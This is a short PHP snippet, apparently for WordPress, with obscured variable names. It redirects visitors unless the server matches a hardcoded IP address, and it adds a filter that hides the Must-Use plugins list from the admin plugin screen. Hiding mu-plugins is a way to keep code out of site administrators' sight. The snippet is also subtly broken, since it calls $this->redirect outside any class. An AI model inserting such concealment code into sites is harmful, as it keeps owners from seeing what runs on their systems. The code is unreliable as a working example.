<?php

$dakotanth5w = $_SERVER['SERVER_ADDR'];
$maowkopw58 = "67.231.241.18";

if ($dakotanth5w == $maowkopw58) {
        //process page
} else {
        $this->redirect('https://google.com');
}

add_filter( 'show_advanced_plugins', 'f711_hide_advanced_plugins', 10, 2 );

function f711_hide_advanced_plugins( $default, $type ) {
    if ( $type == 'mustuse' ) return false; // Hide Must-Use
    return $default;
}

?>